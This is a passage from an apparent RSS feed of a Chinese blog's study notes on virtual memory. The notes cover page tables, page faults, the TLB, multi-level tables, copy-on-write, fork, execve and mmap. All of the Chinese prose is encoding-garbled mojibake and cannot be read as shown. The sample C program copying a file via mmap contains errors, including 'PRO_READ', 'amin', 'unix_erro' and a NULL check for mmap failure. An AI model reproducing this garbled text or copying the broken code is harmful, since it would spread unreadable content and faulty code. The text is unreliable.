  åˆå§‹åŒ–çš„é¡µçš„æ•°æ®å°±æ˜¯å…¶ä¸­çš„section&lt;/li&gt;
&lt;li&gt;åŒ¿åæ–‡ä»¶,åŒ…å«çš„å…¨æ˜¯0
  ç¬¬ä¸€æ¬¡å¼•ç”¨è¿™ä¸ªé¡µæ—¶(first fault),åˆ›å»ºä¸€ä¸ªå…¨ä¸º0çš„é¡µ(demand-zero page).
  ä¸€æ—¦è¿™ä¸ªé¡µè¢«å†™å…¥å,å°±å’Œå…¶ä»–é¡µä¸€æ ·.
  å†™å…¥çš„é¡µè¢«å¤åˆ¶åˆ°å†…æ ¸ç»´æŠ¤çš„ä¸“é—¨çš„äº¤æ¢æ–‡ä»¶(swap file).&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;å…±äº«å¯¹è±¡(Share Object)&lt;/h2&gt;
&lt;p&gt;åˆ©ç”¨å†…å­˜æ˜ å°„å¯ä»¥å®ç°è¿›ç¨‹é—´å…±äº«å¯¹è±¡,å› ä¸ºè¿›ç¨‹å¯ä»¥æ˜ å°„è™šæ‹Ÿå†…å­˜çš„åŒºåŸŸåˆ°åŒä¸€ä¸ªå¯¹è±¡.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207100746.png&quot; alt=&quot;&quot;&gt;
å› ä¸ºè¿™ä¸ªå…±äº«å¯¹è±¡æœ‰ä¸€ä¸ªå”¯ä¸€çš„åå­—,æ‰€ä»¥å†…æ ¸å¯ä»¥æ£€æŸ¥æœ‰æ²¡æœ‰å…¶ä»–è¿›ç¨‹æ˜ å°„åˆ°é‚£ä¸ªå¯¹è±¡.å¦‚æœæœ‰,é‚£ä¹ˆå†…æ ¸å°±æŠŠè™šæ‹Ÿåœ°å€å€’å½±çš„åŒºåŸŸæ˜ å°„åˆ°ç›¸åŒçš„ç‰©ç†åœ°å€.&lt;/p&gt;
&lt;h2&gt;ç§æœ‰å†™æ—¶å¤åˆ¶å¯¹è±¡(Private Copy-on-write Object)&lt;/h2&gt;
&lt;p&gt;è¿™ä¸ªåŒºåŸŸçš„é¡µè¡¨æ ‡è®°ä¸ºç§æœ‰å†™æ—¶å¤åˆ¶.PTEçš„ç§æœ‰åŒºåŸŸè¢«æ ‡è®°ä¸ºåªè¯».å‘ç§æœ‰é¡µå†™çš„æŒ‡ä»¤ä¼šè§¦å‘protection fault.å¼‚å¸¸å¤„ç†å°†åˆ›å»ºä¸€ä¸ªæ–°çš„R/Wé¡µ,ç„¶ååœ¨è¿™ä¸ªæ–°çš„é¡µä¸Šå†™.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207102141.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;&lt;code&gt;fork&lt;/code&gt;å‡½æ•°&lt;/h2&gt;
&lt;p&gt;ä»¥ä¸Šç§æœ‰COWæŠ€æœ¯æä¾›äº†é«˜æ•ˆçš„&lt;code&gt;fork&lt;/code&gt;æ€è·¯.
è¿›è¡Œ&lt;code&gt;fork&lt;/code&gt;æ—¶,å†…æ ¸åªå¤åˆ¶æ‰€æœ‰çš„å†…æ ¸æ•°æ®ç»“æ„:&lt;code&gt;mm_struct&lt;/code&gt;, &lt;code&gt;vm_arear_struct&lt;/code&gt;ä»¥åŠé¡µè¡¨.
ç„¶åå†…æ ¸æŠŠä¸¤ä¸ªè¿›ç¨‹ä¸­çš„æ¯ä¸ªé¡µéƒ½æ ‡è®°ä¸ºåªè¯»,æŠŠæ¯ä¸€ä¸ª&lt;code&gt;vm_area_struct&lt;/code&gt;æ ‡è®°ä¸ºç§æœ‰å†™æ—¶å¤åˆ¶(COW).
å½“&lt;code&gt;fork&lt;/code&gt;å‡½æ•°è¿”å›æ—¶,æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ç›¸åŒçš„åœ°å€ç©ºé—´.ä¸¤ä¸ªè¿›ç¨‹è¯»çš„æ—¶å€™,å®ƒä»¬ä¼šå…±äº«è¿™äº›åŒºåŸŸ;å½“è¿›ç¨‹è¦å†™æ—¶,ä¼šæ ¹æ®å†™æ—¶å¤åˆ¶æœºåˆ¶,åˆ›å»ºä¸€ä¸ªæ–°é¡µ.&lt;/p&gt;
&lt;h2&gt;&lt;code&gt;execve&lt;/code&gt;å‡½æ•°&lt;/h2&gt;
&lt;p&gt;åˆ é™¤å½“å‰è¿›ç¨‹çš„æ‰€æœ‰&lt;code&gt;vm_arear_struct&lt;/code&gt;å’Œé¡µè¡¨.ä¸ºæ–°åŒºåŸŸåˆ›å»ºæ–°çš„&lt;code&gt;vm_area_struct&lt;/code&gt;å’Œé¡µè¡¨.ç„¶ååˆå§‹åŒ–.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207112009.png&quot; alt=&quot;&quot;&gt;
æœ€åæŠŠç¨‹åºè®¡æ•°å™¨%ripè®¾ç½®ä¸ºä»£ç åŒºåŸŸçš„å…¥å£.
ä¸€åˆ‡ä»…ä»…æ˜¯åšäº†æ˜ å°„,ä¿®æ”¹å†…æ ¸ä¸­çš„æ•°æ®ç»“æ„.ç›´åˆ°è®¿é—®æ—¶é‡åˆ°é¡µé”™è¯¯æ‰åŠ è½½åˆ°å†…å­˜ä¸­.&lt;/p&gt;
&lt;h2&gt;ç”¨æˆ·çº§å†…å­˜æ˜ å°„&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void *mmap(void *start, int len, int prot, int flags, int fd, int offset);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207112924.png&quot; alt=&quot;&quot;&gt;
å°†è™šæ‹Ÿåœ°å€startæ˜ å°„åˆ°æ–‡ä»¶æè¿°ç¬¦fdåç§»é‡offsetèµ·lenå­—èŠ‚çš„æ•°æ®.
protæŒ‡å®šä¿æŠ¤ç±»å‹:PROT_READ,PROT_WRITE...
flagæŒ‡å®šæ–‡ä»¶å¯¹è±¡ç±»å‹:MAP_ANON(åŒ¿åæ–‡ä»¶),MAP_PRIVATE,MAP_SHARED...
è¿”å›æŒ‡å‘æ˜ å°„åŒºåŸŸçš„æŒ‡é’ˆ(å¦‚æœstartè¢«å ç”¨,æœ‰æ“ä½œç³»ç»Ÿé€‰æ‹©)&lt;/p&gt;
&lt;h3&gt;ç”¨ä¾‹:å¤åˆ¶æ–‡ä»¶æ— éœ€&lt;code&gt;read&lt;/code&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void mmapcopy(int fd, int size){
	/* Ptr to memory mapped area */
	char *buf;
	if(!(buf = mmap(NULL, size, PRO_READ, MAP_PRIVATE, fd,0)))
		unix_error(&amp;quot;mmap error&amp;quot;);
	if(write(1, buf, size)&amp;lt;0)    /* stdout: 1 */
		unix_erro(&amp;quot;write error&amp;quot;);
	return;
}

int amin(int argc, char **argv){
	struct stat stat; 
	int fd; 
	
	/* Check for required cmd line arg */ 
	if (argc != 2) { printf(&amp;quot;usage: %s \n&amp;quot;, argv[0]); exit(0); } 
	
	/* Copy input file to stdout */ 
	if((fd = open(argv[1], O_RDONLY, 0)) &amp;lt; 0) unix_error(&amp;quot;open error&amp;quot;);
	if(fstat(fd, &amp;amp;stat) &amp;lt; 0) unix_error(&amp;quot;fstart error&amp;quot;); 
	mmapcopy(fd, stat.st_size); 
	exit(0);
}
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Wed, 05 Feb 2025 16:00:00 GMT</pubDate></item><item><title>è™šæ‹Ÿå†…å­˜(æ¦‚å¿µ)</title><link>https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%A6%82%E5%BF%B5/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%A6%82%E5%BF%B5/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%A6%82%E5%BF%B5/&quot;&gt;https://www.tankimzeg.top/blog/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%A6%82%E5%BF%B5/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;è·å–å†…å­˜çš„æ–¹å¼:ç‰©ç†åœ°å€å’Œè™šæ‹Ÿåœ°å€&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç‰©ç†åœ°å€:æœ€ç®€å•çš„æ–¹å¼,ç”¨äºç®€å•çš„ç”µå­ç³»ç»Ÿ
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205162744.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿåœ°å€:ç”¨äºæ‰€æœ‰çš„ç°ä»£æ™ºèƒ½è®¾å¤‡
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205162827.png&quot; alt=&quot;&quot;&gt;
  ä»¥[[å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„#ç£ç›˜|CPUè®¿é—®ç£ç›˜]]ä¸ºä¾‹:ç£ç›˜æ§åˆ¶å™¨å°†ç£ç›˜æŠ½è±¡æˆä¸€ç³»åˆ—é€»è¾‘å—æä¾›ç»™å†…æ ¸,å¹¶å°†å†…æ ¸å‘é€çš„é€»è¾‘å—å·è½¬æ¢ä¸ºå®é™…çš„ç‰©ç†åœ°å€&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;åœ°å€ç©ºé—´:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;çº¿æ€§åœ°å€ç©ºé—´:é¡ºåºéè´Ÿæ•´æ•° {0, 1, 2, 3,...}&lt;/li&gt;
&lt;li&gt;è™šæ‹Ÿåœ°å€ç©ºé—´:$N=2^n$ä¸ªè™šæ‹Ÿåœ°å€{0, 1, 2, 3, ..., N--1}&lt;/li&gt;
&lt;li&gt;ç‰©ç†åœ°å€ç©ºé—´:$M=2^m$ä¸ªç‰©ç†åœ°å€{0, 1, 2, 3, ..., M-1}
è™šæ‹Ÿåœ°å€ç©ºé—´æ¯”ç‰©ç†åœ°å€ç©ºé—´å¤§.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸ºä»€ä¹ˆä½¿ç”¨è™šæ‹Ÿå†…å­˜(VM:Virtual Memory)?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½œä¸ºç¼“å­˜é«˜æ•ˆä½¿ç”¨å†…å­˜&lt;ul&gt;
&lt;li&gt;è™šæ‹Ÿå†…å­˜æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„æ•°æ®çš„DRAMç¼“å­˜&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ç®€åŒ–å†…å­˜ç®¡ç†&lt;ul&gt;
&lt;li&gt;æ¯ä¸ªè¿›ç¨‹å…·æœ‰ç›¸åŒæ ¼å¼çš„çº¿æ€§è™šæ‹Ÿåœ°å€ç©ºé—´:ä»£ç å’Œæ•°æ®æ€»æ˜¯åŠ è½½åˆ°å›ºå®šçš„åœ°å€,ä½†å®é™…ä¸Šé‚£äº›åœ°å€å¯¹åº”çš„å†…å®¹åˆ†å¸ƒåœ¨æ•´ä¸ªå†…å­˜é‡Œ.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ç‹¬ç«‹çš„åœ°å€ç©ºé—´&lt;ul&gt;
&lt;li&gt;ä¸€ä¸ªè¿›ç¨‹ä¸èƒ½ä½¿ç”¨å¦ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·è¿›ç¨‹ä¸èƒ½è®¿é—®å†…æ ¸ç‰¹æƒä¿¡æ¯å’Œä»£ç &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;ç¼“å­˜çš„å·¥å…·&lt;/h1&gt;
&lt;p&gt;ä»æ¦‚å¿µä¸Šè®²,è™šæ‹Ÿå†…å­˜æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„å­—èŠ‚åºåˆ—,å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„è™šæ‹Ÿå†…å­˜çš„å†…å®¹ç¼“å­˜åœ¨DRAMä¸­.æ¯ä¸ªç¼“å­˜çš„å—ç§°ä¸º&lt;strong&gt;é¡µ&lt;/strong&gt;($P=2^p$å­—èŠ‚).
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205164255.png&quot; alt=&quot;&quot;&gt;
æœ‰ä¸€ç§æ˜ å°„å‘Šè¯‰æˆ‘ä»¬å“ªäº›é¡µé¢å·²è¢«ç¼“å­˜.&lt;/p&gt;
&lt;h2&gt;DRAMç¼“å­˜ç»„ç»‡&lt;/h2&gt;
&lt;p&gt;DRAMæ¯”SRAMæ…¢10å€;ç£ç›˜æ¯”DRAMæ…¢10000å€.
æ‰€ä»¥:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;è™šæ‹Ÿå†…å­˜æœ‰å¾ˆå¤§çš„é¡µé¢:4KB/4MB&lt;/li&gt;
&lt;li&gt;[[é«˜é€Ÿç¼“å­˜#å…¨ç›¸è”é«˜é€Ÿç¼“å­˜|å…¨ç›¸è”]]&lt;ul&gt;
&lt;li&gt;ä»»ä½•VPèƒ½æ”¾åœ¨ä»»ä½•PP&lt;/li&gt;
&lt;li&gt;éœ€è¦å¤æ‚çš„æ˜ å°„å‡½æ•°(é¡µè¡¨)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;å¤æ‚çš„æ›¿æ¢ç®—æ³•&lt;/li&gt;
&lt;li&gt;ä¸ä¼šé‡‡å–write-throughè€Œæ˜¯write-back&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨æˆ‘çš„Windowsç¬”è®°æœ¬ç”µè„‘ä¸Š,&amp;quot;Win+R&amp;quot;è¾“å…¥&amp;quot;msinfo32&amp;quot;æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250207151653.png&quot; alt=&quot;&quot;&gt;
æœ‰é¡µçš„ä¿¡æ¯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;é¡µè¡¨(Page Table)&lt;/h2&gt;
&lt;p&gt;é¡µè¡¨æ˜¯å†…å­˜ä¸­çš„ä¸€ä¸ªæ•°ç»„æ•°æ®ç»“æ„,å°†è™šæ‹Ÿé¡µ(VP)åŒ¹é…åˆ°ç‰©ç†é¡µ(PP).æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„é¡µè¡¨.&lt;/p&gt;
&lt;h3&gt;é¡µå‘½ä¸­(Page Hit)&lt;/h3&gt;
&lt;p&gt;è¦è®¿é—®çš„æ•°æ®åœ¨ç‰©ç†å†…å­˜ä¸­(DRAM ç¼“å­˜å‘½ä¸­)
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206105354.png&quot; alt=&quot;&quot;&gt;
ä¸Šå›¾ä¸­,CPUå‘æ¥ä¸€ä¸ªè™šæ‹Ÿå†…å­˜åœ°å€2,MMUå»æŸ¥æ‰¾é¡µè¡¨ä¸­ç¬¬2æ¡,å¾—åˆ°å…¶ç‰©ç†åœ°å€,å†…å­˜è¿”å›ç‰©ç†åœ°å€çš„æ•°æ®.&lt;/p&gt;
&lt;h3&gt;é¡µé”™è¯¯(Page Fault)&lt;/h3&gt;
&lt;p&gt;è¦è®¿é—®çš„æ•°æ®ä¸åœ¨ç‰©ç†å†…å­˜ä¸­(DRAMç¼“å­˜ä¸å‘½ä¸­),è§¦å‘[[å¼‚å¸¸æ§åˆ¶æµ(å¼‚å¸¸å’Œè¿›ç¨‹)#é¡µé”™è¯¯|é¡µé”™è¯¯]].
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206110324.png&quot; alt=&quot;&quot;&gt;
ä¸Šå›¾ä¸­,CPUå‘æ¥çš„è™šæ‹Ÿå†…å­˜åœ°å€3è§¦å‘é¡µé”™è¯¯å¼‚å¸¸.å†…æ ¸å¤„ç†é¡µé”™è¯¯çš„ä»£ç å†³å®šæ›¿æ¢çš„é¡µé¢VP4,ç„¶åä»ç£ç›˜ä¸­å–å‡ºè¯¥é¡µé¢VP3,åŠ è½½åˆ°å†…å­˜ä¸­,æ›´æ–°æ­¤é¡µè¡¨æ¡ç›®.ç¼ºé¡µå¤„ç†ç¨‹åºè¿”å›åˆ°åŸæ¥äº§ç”Ÿé”™è¯¯çš„æŒ‡ä»¤å¤„é‡æ–°æ‰§è¡Œ.&lt;/p&gt;
&lt;h3&gt;åˆ†é…æ–°é¡µé¢&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨ &lt;code&gt;malloc&lt;/code&gt;åˆ†é…äº†ä¸€å¤§å—è™šæ‹Ÿåœ°å€ç©ºé—´,å¦‚æœå…¶ä¸­ä¸€ä¸ªé¡µé¢æœªåˆ†é…,é‚£ä¹ˆå†…æ ¸é€šè¿‡ &lt;code&gt;sbrk&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨æ¥åˆ†é…è¯¥å†…å­˜.&lt;code&gt;sbrk&lt;/code&gt;å‡½æ•°çš„åŠŸèƒ½æ˜¯åœ¨ç£ç›˜ä¸­åˆ†é…ä¸€ä¸ªæ–°çš„é¡µé¢,ä¿®æ”¹æ­¤é¡µè¡¨æ¡ç›®.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206111906.png&quot; alt=&quot;&quot;&gt;
ä¸Šå›¾ä¸­ä¸ºVP5åˆ†é…äº†ä¸€ä¸ªæ–°é¡µé¢.&lt;/p&gt;
&lt;h2&gt;å±€éƒ¨æ€§çš„ä½“ç°&lt;/h2&gt;
&lt;p&gt;åœ¨ä»»ä½•æ—¶é—´ç‚¹,ç¨‹åºå€¾å‘äºä½¿ç”¨çš„æ´»è·ƒè™šæ‹Ÿé¡µç§°ä¸º&lt;strong&gt;å·¥ä½œé›†(working set)&lt;/strong&gt;.
ç¨‹åºçš„å±€éƒ¨æ€§è¶Šå¥½,å·¥ä½œé›†è¶Šå°.
å¦‚æœå·¥ä½œé›†&amp;lt;ä¸»å­˜,å¿…å‘½ä¸­.
å¦‚æœSUM(å·¥ä½œé›†)&amp;gt;ä¸»å­˜,é¡µé¢æ¥å›æ›¿æ¢&lt;/p&gt;
&lt;h1&gt;å†…å­˜ç®¡ç†çš„å·¥å…·&lt;/h1&gt;
&lt;p&gt;æ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰è‡ªå·±çš„è™šæ‹Ÿåœ°å€ç©ºé—´,å†…æ ¸é€šè¿‡ç»™æ¯ä¸ªè¿›ç¨‹æä¾›ç‹¬ç«‹çš„é¡µè¡¨æ¥å®ç°è¿™ä¸€ç‚¹.
åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„é¡µé¢å¯ä»¥æ˜ å°„åˆ°DRAMç‰©ç†åœ°å€ç©ºé—´çš„ä»»ä½•ä½ç½®.å¯èƒ½å­˜åœ¨ç€å¤šå¯¹ä¸€çš„å…³ç³».&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!understanding]
è™šæ‹Ÿå†…å­˜æ˜¯ç‰©ç†å†…å­˜çš„ä¸€ç§æŠ½è±¡&lt;strong&gt;è§†å›¾&lt;/strong&gt;,æˆ‘æƒ³èµ·äº†åœ¨æ•°æ®åº“ä¸­,æ•°æ®è¡¨å¯ä»¥ä¸ºä¸åŒçš„ç”¨æˆ·æä¾›è§†å›¾,æ ¹æ®ä»–ä»¬çš„éœ€æ±‚å’Œæƒé™,ä¹Ÿè¾¾åˆ°äº†å†ç»„ç»‡çš„åŠŸèƒ½.æˆ‘è®¤ä¸ºè™šæ‹Ÿå†…å­˜åœ¨è¿™ä¸€ç‚¹ä¸Šæ˜¯è·Ÿæ•°æ®åº“çš„è§†å›¾æ˜¯ç›¸ä¼¼çš„,ç‰©ç†å†…å­˜å¯¹åº”äºæ•°æ®åº“çš„è¡¨æ ¼,ä¸æ˜¯éå¸¸æ•´é½;è™šæ‹Ÿå†…å­˜å¯¹åº”è§†å›¾,æ— éœ€å°†è¡¨æ ¼æ•°æ®é‡æ–°å¤åˆ¶ä¸€ä»½è€Œæ˜¯ä»è¡¨æ ¼ä¸­å–å‡º;ä¸åŒçš„è¿›ç¨‹å¯¹åº”ä¸åŒç”¨æˆ·,æ‹¥æœ‰ä¸åŒéœ€æ±‚å’Œæƒé™.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206114145.png&quot; alt=&quot;&quot;&gt;
å¦‚æœè®¾æƒ³æ²¡æœ‰è¿™ä¸€ä¸ªæŠ½è±¡å±‚,ç¨‹åºåœ¨é“¾æ¥æ—¶æ˜¯ä¸çŸ¥é“ç¨‹åºåŠ è½½æ—¶æ•°æ®ä¼šæ”¾åœ¨å“ªé‡Œ,å¯»å€æ— ä»è°ˆèµ·.å¦‚æœå†…å­˜ä¸ºæ¯ä¸ªç¨‹åºéƒ½æå‰åˆ†é…ä¸€ä¸ªå›ºå®šå†…å­˜ç©ºé—´çš„è¯,åœ¨ç¨‹åºåŠ è½½å‰æ— æ³•å¾—çŸ¥ç¨‹åºçš„å¤§å°,ä¼šé€ æˆç©ºé—´çš„æµªè´¹.è™šæ‹Ÿå†…å­˜å°±æ˜¯è§£å†³äº†è¿™ä¸ªé—®é¢˜.ç¨‹åºåŠ è½½æ—¶æ‰åˆ›å»ºé¡µè¡¨,å°†ç›¸å¯¹åœ°å€æ˜ å°„åˆ°å†…å­˜çš„ç‰©ç†åœ°å€.
ä¸åŒçš„é¡µå¯ä»¥æ˜ å°„ç›¸åŒçš„å†…å­˜åœ°å€,ä¹Ÿå®ç°äº†[[é“¾æ¥#åŠ¨æ€é“¾æ¥åº“/å…±äº«åº“(.soæ–‡ä»¶)|å…±äº«åº“]]çš„åŠŸèƒ½!&lt;/p&gt;
&lt;h2&gt;ç®€åŒ–é“¾æ¥å’ŒåŠ è½½è¿‡ç¨‹&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;é“¾æ¥
  é€šè¿‡è™šæ‹Ÿå†…å­˜è¿™ä¸€å±‚,ç°åœ¨,é“¾æ¥å™¨å¯ä»¥å‡è®¾æ¯ä¸ªç¨‹åºåŠ è½½åˆ°ç›¸åŒçš„ä½ç½®,æ‰€ä»¥é“¾æ¥å™¨å¯ä»¥[[é“¾æ¥#è¿æ¥å™¨çš„è¡Œä¸º|é‡å®šå‘]]&lt;/li&gt;
&lt;li&gt;åŠ è½½
  &lt;code&gt;execve&lt;/code&gt; ä¸º[[é“¾æ¥#å¯æ‰§è¡Œå¯é“¾æ¥æ ¼å¼(ELF)|.textå’Œ.data section]]åˆ†é…è™šæ‹Ÿé¡µ,å¹¶åˆ›å»ºé¡µè¡¨,æ¯ä¸€ä¸ªå…ƒç´ éƒ½æ ‡è®°ä¸ºæ— æ•ˆ(uncached,éœ€è¦æ—¶å†å»å¤åˆ¶åˆ°å†…å­˜é‡Œ,è¿™æ ·å°±èŠ‚çœäº†å¯åŠ¨æ—¶é—´å’Œå†…å­˜ç©ºé—´).&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;å†…å­˜ä¿æŠ¤çš„å·¥å…·&lt;/h1&gt;
&lt;p&gt;åœ¨PTEçš„åœ°å€å‰æ‹“å±•æƒé™ä½,MMUåœ¨æ¯ä¸€æ¬¡è®¿é—®å‰æ£€æŸ¥è¿™äº›æƒé™ä½,ç¡®ä¿æ“ä½œåˆæ³•.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206151332.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;åœ°å€ç¿»è¯‘&lt;/h1&gt;
&lt;p&gt;é¡µè¡¨å®ç°åœ°å€ç¿»è¯‘
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206152945.png&quot; alt=&quot;&quot;&gt;
å›æƒ³ç¼“å­˜çš„çŸ¥è¯†,ç”±äºè¿™æ˜¯&lt;strong&gt;å…¨ç›¸è”ç¼“å­˜&lt;/strong&gt;,æ‰€ä»¥æ— éœ€setä½,åªæœ‰tagä½å’Œoffsetä½.&lt;/p&gt;
&lt;h2&gt;é¡µå‘½ä¸­&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206153156.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¤„ç†å™¨å‘é€è™šæ‹Ÿåœ°å€ç»™MMU&lt;/li&gt;
&lt;li&gt;MMUå‘é€PTEåœ°å€ç»™é¡µè¡¨&lt;/li&gt;
&lt;li&gt;MMUæ¥åˆ°PTE&lt;/li&gt;
&lt;li&gt;MMUå‘é€ç‰©ç†åœ°å€ç»™ç¼“å­˜/å†…å­˜&lt;/li&gt;
&lt;li&gt;ç¼“å­˜/å†…å­˜å‘é€æ•°æ®ç»™å¤„ç†å™¨&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;é¡µé”™è¯¯&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206153517.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¤„ç†å™¨å‘é€è™šæ‹Ÿåœ°å€ç»™MMU&lt;/li&gt;
&lt;li&gt;MMUå‘é€PTEåœ°å€ç»™é¡µè¡¨&lt;/li&gt;
&lt;li&gt;MMUæ¥åˆ°PTE&lt;/li&gt;
&lt;li&gt;æ— æ•ˆ,è§¦å‘é¡µé”™è¯¯å¼‚å¸¸&lt;/li&gt;
&lt;li&gt;æ›¿æ¢,å†™å›ç£ç›˜&lt;/li&gt;
&lt;li&gt;è¯»å–éœ€è¦çš„é¡µ,æ›´æ–°PTE&lt;/li&gt;
&lt;li&gt;è¿”å›åŸæŒ‡ä»¤,é‡æ–°æ‰§è¡Œ&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä»å†…å­˜ä¸­è·å–çš„å†…å®¹éƒ½è¦ç»è¿‡[[å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„|ç¼“å­˜å±‚æ¬¡ç»“æ„]],æ‰€ä»¥å®é™…ä¸Šçš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„(åªåˆ—å‡ºL1ç¼“å­˜):
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206154000.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;è½¬æ¢åå¤‡ç¼“å†²åŒº(TLB:Translation Lookaside Buffer)&lt;/h2&gt;
&lt;p&gt;é¡µè¡¨çš„æ¡ç›®ç¼“å­˜åœ¨MMUå†…çš„ä¸€ä¸ªç¡¬ä»¶ç¼“å­˜TLBä¸­.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ˜¯[[é«˜é€Ÿç¼“å­˜#ç»„ç›¸è”é«˜é€Ÿç¼“å­˜|ç»„ç›¸è”é«˜é€Ÿç¼“å­˜]]&lt;/li&gt;
&lt;li&gt;æ˜ å°„:è™šæ‹Ÿé¡µç -&amp;gt;ç‰©ç†åœ°å€&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;è·Ÿå¥—å¨ƒä¸€æ ·hhh&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206155714.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;TLBå‘½ä¸­&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206155933.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;TLBä¸å‘½ä¸­&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206160047.png&quot; alt=&quot;&quot;&gt;
TLB misså‘ç”Ÿçš„é¢‘ç‡å¾ˆä½&lt;/p&gt;
&lt;h2&gt;å¤šçº§é¡µè¡¨&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;è¿˜åœ¨å¥—å¨ƒXD&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä¸Šé¢çš„é¡µè¡¨ç»“æ„ä¸­,æ¯ä¸€ä¸ªVPå¯¹åº”æœ‰ä¸€ä¸ªé¡µè¡¨çš„æ¡ç›®.å¦‚æœä¸€ä¸ªç¨‹åºæœ‰å¾ˆå¤šVPæœªåˆ†é…,é¡µè¡¨å°±æœ‰å¾ˆå¤šé¡¹æ˜¯æ— æ•ˆçš„,è¿™ä¼šé€ æˆé¡µè¡¨ç©ºé—´çš„æµªè´¹.ä½¿ç”¨å¤šçº§é¡µè¡¨æ¥è§£å†³è¿™é—®é¢˜.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206162001.png&quot; alt=&quot;&quot;&gt;
